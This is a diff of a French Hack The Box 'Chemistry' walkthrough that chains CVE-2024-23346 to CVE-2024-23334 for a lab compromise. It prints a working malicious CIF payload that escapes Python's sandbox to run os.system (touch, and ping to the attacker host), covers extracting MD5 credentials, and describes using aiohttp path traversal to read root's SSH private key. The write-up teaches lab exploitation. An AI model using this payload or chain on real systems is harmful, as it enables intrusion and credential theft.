@@ -529,15 +529,9 @@ Cette étape est importante : identifier la technologie utilisée permet de cibl
 
 La suite consiste donc à rechercher des vulnérabilités affectant pymatgen.
 
-------
-
 ### CVE-2024-23346 — Remote Code Execution via CIF Upload (Pymatgen)
 
 Cette vulnérabilité est le point d’entrée principal de la machine Chemistry sur Hack The Box.
-
-En recherchant des vulnérabilités liées au parsing de fichiers CIF en Python, une faille critique ressort immédiatement :
-
-**CVE-2024-23346 — Pymatgen Remote Code Execution (RCE)**
 
 Une recherche ciblée sur les parsers CIF en Python met rapidement en évidence une vulnérabilité critique :
 
@@ -547,15 +541,17 @@ Cette faille permet l’exécution de code arbitraire lors du parsing d’un fic
 
 Dans le contexte de l’application Chemistry, cela correspond exactement au comportement observé :
 
-\- upload d’un fichier
-\- traitement côté serveur
-\- affichage des données (*view*)
+- upload d’un fichier
+- traitement côté serveur
+- affichage des données (*view*)
 
 Le vecteur d’attaque est donc clair : exploiter le parsing du fichier CIF pour déclencher une exécution de code.
 
-Un PoC public est disponible dans l’[advisory GitHub Security Advisory](https://github.com/advisories/GHSA-vgv8-5cpj-qj2f) associé à cette vulnérabilité. Il fournit un fichier CIF malveillant nommé `vuln.cif`, qui va servir de base pour valider l’exploitation sur la machine.
+Un PoC public est disponible dans l’advisory GitHub Security Advisory associé à cette vulnérabilité. Il fournit un fichier CIF malveillant nommé `vuln.cif`, qui va servir de base pour valider l’exploitation sur la machine.
 
-### Analyse du Proof of Concept (PoC)
+---
+
+### Analyse du PoC
 
 En analysant le PoC, tu constates que la vulnérabilité repose sur une injection dans une section spécifique du fichier CIF.
 
@@ -565,7 +561,9 @@ Le payload est donc exécuté lors du *view*, et non lors de l’upload.
 
 Le vecteur d’attaque est donc le traitement du fichier côté serveur.
 
-#### Le fichier vuln.cif
+---
+
+### Structure du fichier vuln.cif
 
 Le PoC repose sur un fichier CIF malveillant nommé `vuln.cif`, contenant une commande de test (`touch pwned`) pour valider l’exécution de code.
 
@@ -583,7 +581,6 @@ k1 [0 0 0]
 
 _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'
 
-
 _space_group_magn.number_BNS  62.448
 _space_group_magn.name_BNS  "P  n'  m  a'  "
 ```
@@ -592,7 +589,11 @@ Tous les éléments du fichier ne participent pas à l’exploitation.
 
 La ligne critique est :
 
-`_space_group_magn.transform_BNS_Pp_abc '...payload...'`
+```bash
+_space_group_magn.transform_BNS_Pp_abc '...payload...'
+```
+
+
 
 Le reste du fichier sert uniquement à :
 
@@ -602,7 +603,9 @@ Le reste du fichier sert uniquement à :
 
 Le payload injecté dans ce champ permet d’exécuter une commande système côté serveur via `os.system()`.
 
-#### Test initial avec vuln.cif
+---
+
+### Validation de l’exécution de code
 
 Après l’upload et le *view* de `vuln.cif`, l’application retourne une erreur **500 – Internal Server Error**.
 
@@ -612,7 +615,9 @@ Cependant, sans accès direct au système de fichiers, il est impossible de vér
 
 Il faut donc utiliser une commande produisant un effet observable depuis ta machine.
 
-#### Création d’un PoC réseau : poc-ping.cif
+---
+
+### Confirmation via un PoC réseau (poc-ping.cif)
 
 Pour confirmer l’exécution de code, tu modifies la commande injectée afin de générer un trafic réseau sortant vers ta machine Kali.
 
@@ -630,7 +635,7 @@ Crée ensuite le fichier :
 nano poc-ping.cif
 ```
 
-> Note : Les fichiers CIF sont disponibles en téléchargement dans les [Pièces jointes](#pièces-jointes)
+> Note : Les fichiers CIF sont disponibles en téléchargement dans les Pièces jointes.
 
 ```bash
 data_5yOhtAoR
@@ -644,12 +649,13 @@ k1 [0 0 0]
 
 _space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping -c 5 10.10.x.x");0,0,0'
 
-
 _space_group_magn.number_BNS  62.448
 _space_group_magn.name_BNS  "P  n'  m  a'  "
 ```
 
-#### Observation côté Kali
+
+
+### Observation du comportement côté Kali
 
 Dans une fenêtre Kali, lance la commande :
 
@@ -657,9 +663,12 @@ Dans une fenêtre Kali, lance la commande :
 sudo tcpdump -ni tun0 icmp
 ```
 
+
+
 Via l’interface web :
 
 - uploade le fichier
+
 - clique sur `view`
 
 Tu observes plusieurs requêtes ICMP :
@@ -670,24 +679,26 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 10:41:31.937241 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 1, length 64
 10:41:31.937251 IP 10.10.x.x > 10.129.x.x: ICMP echo reply, id 2, seq 1, length 64
 10:41:32.904025 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 2, length 64
-10:41:32.904039 IP 10.10.x.x > 10.129x.x: ICMP echo reply, id 2, seq 2, length 64
+10:41:32.904039 IP 10.10.x.x > 10.129.x.x: ICMP echo reply, id 2, seq 2, length 64
 10:41:33.905702 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 3, length 64
-10:41:33.905717 IP 10.10.x.x > 10.129x.x: ICMP echo reply, id 2, seq 3, length 64
+10:41:33.905717 IP 10.10.x.x > 10.129.x.x: ICMP echo reply, id 2, seq 3, length 64
 10:41:34.908317 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 4, length 64
-10:41:34.908333 IP 10.10.x.x > 10.129x.x: ICMP echo reply, id 2, seq 4, length 64
+10:41:34.908333 IP 10.10.x.x > 10.129.x.x: ICMP echo reply, id 2, seq 4, length 64
 10:41:35.909620 IP 10.129.x.x > 10.10.x.x: ICMP echo request, id 2, seq 5, length 64
 10:41:35.909635 IP 10.10.x.x > 10.129.x.x: ICMP echo reply, id 2, seq 5, length 64
-^C
+
 10 packets captured
 10 packets received by filter
 0 packets dropped by kernel
 ```
 
+
+
 Le trafic ICMP confirme que la commande système a bien été exécutée côté serveur.
 
 L’erreur 500 intervient après l’exécution du payload et ne remet pas en cause l’exploitation.
 
-> Note : Limite le nombre de pings (ici 5) pour ne pas entrer dans une boucle infinie
+> Note : Limite le nombre de pings (ici 5) pour ne pas entrer dans une boucle infinie.
 
 ### Obtention du reverse shell
 
@@ -795,7 +806,6 @@ drwx------ 2 app app 4096 Feb 17 11:00 instance
 drwx------ 2 app app 4096 Oct  9  2024 static
 drwx------ 2 app app 4096 Oct  9  2024 templates
 drwx------ 2 app app 4096 Feb 17 11:00 uploads
-ls -l
 ```
 
 Le fichier `app.py` attire immédiatement l’attention.
@@ -900,8 +910,6 @@ Cela correspond fortement à des hash MD5 non salés.
 
 > Important : le hash est MD5 simple, sans sel.
 > C’est une très mauvaise pratique en production, mais classique en CTF.
-
-------
 
 ### Extraction des credentials
 
@@ -1061,6 +1069,7 @@ Tu peux maintenant passer à l’escalade de privilèges.
 ## Escalade de privilèges
 
 {{< escalade-intro user="rosa" >}}
+
 ### Sudo -l
 
 Tu commences toujours par vérifier les droits <code>sudo</code> :
@@ -1211,8 +1220,6 @@ Aucun binaire manifestement exploitable via GTFOBins.
 
 Rien d’exploitable à ce stade.
 
-------
-
 ### Analyse des services en écoute
 
 Tu vérifies ensuite les services actifs :
@@ -1250,7 +1257,7 @@ Dans le cadre d’une escalade de privilèges, c’est donc **la seule surface d
 > - Le service interne sur 127.0.0.1:8080 sert ses fichiers statiques via `/assets/`.
 
 
-### Identification du service en 127.0.0.1:8080
+### Analyse du service interne (127.0.0.1:8080)
 
 Le port **8080** fait immédiatement penser à un service HTTP alternatif.
 
@@ -1277,16 +1284,11 @@ Nous avons donc affaire à une application web interne développée en Python.
 
 Dans un contexte CTF, un service interne en Python accessible uniquement en local constitue une piste sérieuse d’escalade.
 
+Identifier une version précise d’un framework web Python est ici un signal fort.
 
+L’identification de la version aiohttp ouvre immédiatement la voie à la recherche de vulnérabilités connues.
 
-### CVE-2024-23334 — Path Traversal dans aiohttp (service interne)
-
-L’en-tête HTTP du service local indique :
-
-Server: Python/3.9 aiohttp/3.9.1
-
-Dans le contexte d’un CTF, identifier une version précise d’un framework web Python est un signal fort.
- Une recherche ciblée associant *aiohttp 3.9.1* et *path traversal* mène rapidement à :
+Une recherche ciblée associant *aiohttp 3.9.1* et *path traversal* met rapidement en évidence une vulnérabilité critique :
 
 CVE-2024-23334 — vulnérabilité de type path traversal affectant la gestion des fichiers statiques dans certaines configurations aiohttp.
 
@@ -1297,8 +1299,7 @@ Autrement dit :
 
 #### Adaptation du PoC à la machine Chemistry
 
-Un PoC public est disponible ici :
- https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh
+Un PoC public est disponible [ici](https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh).
 
 Le script d’origine cible :
 
@@ -1454,8 +1455,6 @@ ce service n’était pas accessible depuis l’extérieur.
 
 Il constitue donc **une surface d’attaque interne révélée uniquement après l’obtention d’un shell utilisateur** — ce qui correspond parfaitement à un scénario d’escalade de privilèges.
 
-------
-
 ### root.txt
 
 #### Lecture directe de root.txt
@@ -1493,8 +1492,6 @@ La lecture du flag root.txt confirme que :
 
 Cependant, lire un fichier ne signifie pas encore disposer d’un shell root interactif. Tu as accès aux données, mais pas encore au contrôle complet du système.
 
-#### Extraction de la clé privée root
-
 Dans une logique d’escalade complète, il est préférable d’obtenir un accès interactif root.
 
 Une cible naturelle est donc :
@@ -1523,8 +1520,6 @@ Cela signifie que :
 - la clé privée SSH de root est lisible
 - la protection du dossier /root est totalement contournée
 - l’escalade peut désormais devenir interactive
-
-#### Obtention d’une session root interactive
 
 Tu récupères la clé sur ta machine Kali à l’aide de la recette {{< recette "copier-fichiers-kali" >}}, puis tu la sauvegardes dans un fichier local.
 
@@ -1569,10 +1564,12 @@ Dans un environnement réel, un service interne mal configuré exposant un répe
 La machine **Chemistry** illustre parfaitement comment une vulnérabilité applicative peut servir de point d’entrée vers une compromission complète du système.
 
 Tout commence par une **Remote Code Execution via upload de fichier CIF (CVE-2024-23346)** exploitant la bibliothèque Python *pymatgen*.
- Cette première faille permet d’obtenir un reverse shell et un accès utilisateur limité.
+
+Cette première faille permet d’obtenir un reverse shell et un accès utilisateur limité.
 
 Mais l’élément déterminant réside ensuite dans l’analyse méthodique du système :
- l’identification d’un service interne exposé uniquement en local, basé sur **aiohttp 3.9.1**, conduit à l’exploitation d’une seconde vulnérabilité critique — **CVE-2024-23334**, une faille de type path traversal.
+
+l’identification d’un service interne exposé uniquement en local, basé sur **aiohttp 3.9.1**, conduit à l’exploitation d’une seconde vulnérabilité critique — **CVE-2024-23334**, une faille de type path traversal.
 
 Cette combinaison de faiblesses montre une réalité importante en sécurité offensive :
 
@@ -1588,7 +1585,6 @@ Tu disposes maintenant d’une vue complète du cycle d’attaque :
 RCE → reverse shell → pivot utilisateur → exploitation d’un service interne → accès root.
 
 Ce type d’enchaînement de vulnérabilités — RCE initiale puis exploitation d’un service interne mal isolé — reflète des erreurs que l’on retrouve régulièrement en environnement réel.
----
 
 ## Ce que tu dois retenir
 
